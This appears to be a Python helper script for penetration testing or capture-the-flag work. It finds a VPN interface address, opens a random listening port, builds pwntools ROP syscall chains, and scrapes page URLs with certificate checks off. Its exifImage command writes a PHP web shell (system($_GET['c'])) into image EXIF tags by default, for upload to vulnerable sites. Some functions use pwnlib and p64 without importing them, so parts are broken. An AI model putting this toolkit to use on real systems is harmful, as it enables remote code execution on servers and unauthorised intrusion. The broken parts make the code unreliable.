#!/usr/bin/env python

import random
import socket
import netifaces as ni
import requests
import sys
import exif
import os
import io
from PIL import Image
from bs4 import BeautifulSoup

def getAddress(interface="tun0"):
    if not interface in ni.interfaces():
        interfaces = ni.interfaces()
        interfaces.remove('lo')
        interface = interfaces[0]

    addresses = ni.ifaddresses(interface)
    addresses = [addresses[ni.AF_INET][i]["addr"] for i in range(len(addresses[ni.AF_INET]))]
    addresses = [addr for addr in addresses if not str(addr).startswith("127")]
    return addresses[0]

def openServer(address, ports=None):
    listenPort = None
    retry = True
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while retry:

        if isinstance(ports, int):
            listenPort = ports
            retry = False
        elif isinstance(ports, range):
            listenPort = random.randint(ports[0],ports[-1])
        elif ports is None:
            listenPort = random.randint(10000,65535)

        try:
            sock.bind((address, listenPort))
            sock.listen(1)
            return sock
        except Exception as e:
            if not retry:
                print("Unable to listen on port %d: %s" % (listenPort, str(e)))
            raise e

class Stack:
    def __init__(self, startAddress):
        self.buffer = b""
        self.address = startAddress

    def pushString(self, data):
        addr = self.address
        data = pad(data.encode() + b"\x00", 8)
        self.buffer += data
        self.address += len(data)
        return addr

    def pushAddr(self, addr):
        ptr = self.address
        data = p64(addr)
        self.buffer += data
        self.address += len(data)
        return ptr

    def pushArray(self, arr):
        addresses = []
        for arg in arr:
            arg_addr = self.pushString(arg)
            addresses.append(arg_addr)
        addresses.append(0x0)

        addr = self.address
        for arg_addr in addresses:
            self.pushAddr(arg_addr)

        return addr

def setRegisters(elf, registers):
    from pwn import ROP
    rop = ROP(elf)
    for t in rop.setRegisters(registers):
        value = t[0]
        gadget = t[1]
        if type(gadget) == pwnlib.rop.gadgets.Gadget:
            rop.raw(gadget.address)
            for reg in gadget.regs:
                if reg in registers:
                    rop.raw(registers[reg])
                else:
                    rop.raw(0)
    return rop

def genSyscall(elf, syscall, registers):
    registers["rax"] = syscall
    rop = setRegisters(elf, registers)
    syscall_gadget = "syscall" if elf.arch == "amd64" else "int 0x80"
    rop.raw(rop.find_gadget([syscall_gadget]).address)
    return rop

def pad(x, n):
    if len(x) % n != 0:
        x  += (n-(len(x)%n))*b"\x00"
    return x

def exifImage(payload="<?php system($_GET['c']);?>", _in=None, _out=None, exif_tag=None):

    if _in is None or (isinstance(_in, str) and not os.path.exists(_in)):
        _in = Image.new("RGB", (50,50), (255,255,255))

    if isinstance(_in, str):
        _in = exif.Image(open(_in, "rb"))
    elif isinstance(_in, Image.Image):
        bytes = io.BytesIO()
        _in.save(bytes, format='PNG')
        _in = exif.Image(bytes.getvalue())
    elif not isinstance(_in, exif.Image):
        print("Invalid input. Either give an Image or a path to an image.")
        return

    valid_tags = list(exif._constants.ATTRIBUTE_NAME_MAP.values())
    if exif_tag is None:
        _in.image_description = payload
    elif exif_tag == "all":
        for exif_tag in valid_tags:
            try:
                _in[exif_tag] = payload
                print("adding:", exif_tag)
            except Exception as e:
                pass
    else:
        if exif_tag not in valid_tags:
            print("Invalid exif-tag. Choose one of the following:")
            print(", ".join(valid_tags))
            return

        _in[exif_tag] = payload

    if _out is None:
        sys.stdout.write(_in.get_file())
        sys.stdout.flush()
    elif isinstance(_out, str):
        with open(_out, "wb") as f:
            f.write(_in.get_file())
    elif hasattr(_out, "write"):
        _out.write(_in.get_file())
    else:
        print("Invalid output argument.")

def collectUrls(input):
    if not isinstance(input, BeautifulSoup):
        input = BeautifulSoup(input, "html.parser")

    urls = set()
    attrs = ["src","href","action"]
    tags = ["a","link","script","img","form"]

    for tag in tags:
        for e in input.find_all(tag):
            for attr in attrs:
                if e.has_attr(attr):
                    urls.add(e[attr])

    return urls

if __name__ == "__main__":
    bin = sys.argv[0]
    if len(sys.argv) < 2:
        print("Usage: %s [command]" % bin)
        exit(1)

    command = sys.argv[1]
    if command == "getAddress":
        if len(sys.argv) >= 3:
            print(getAddress(sys.argv[2]))
        else:
            print(getAddress())
    elif command == "pad":
        if len(sys.argv) >= 3:
            n = 8
            if len(sys.argv) >= 4:
                n = int(sys.argv[3])
            print(pad(sys.argv[2].encode(), n))
        else:
            print("Usage: %s pad <str> [n=8]" % bin)
    elif command == "exifImage":
        if len(sys.argv) < 4:
            print("Usage: %s exifImage <file> <payload> [tag]" % bin)
        else:
            _in = sys.argv[2]
            payload = sys.argv[3]
            if payload == "-":
                payload = sys.stdin.readlines()

            tag = None if len(sys.argv) < 5 else sys.argv[4]
            _out = _in.split(".")
            if len(_out) == 1:
                _out = _in + "_exif"
            else:
                _out = ".".join(_out[0:-1]) + "_exif." + _out[-1]

            exifImage(payload, _in, _out, tag)
    elif command == "collectUrls":
        if len(sys.argv) < 3:
            print("Usage: %s collectUrls <url/file>" % bin)
        else:
            uri = sys.argv[2]
            if os.path.isfile(uri):
                data = open(uri,"r").read()
            else:
                res = requests.get(uri, verify=False)
                if res.status_code != 200:
                    print("%s returned: %d %s" % (uri, res.status_code, res.reason))
                    exit()
                data = res.text
            for item in sorted(collectUrls(data)):
                print(item)
    elif command == "help":
        print("Usage: %s [command]" % bin)
        print("Available commands:")
        print("   help, getAddress, pad, collectUrls, exifImage")
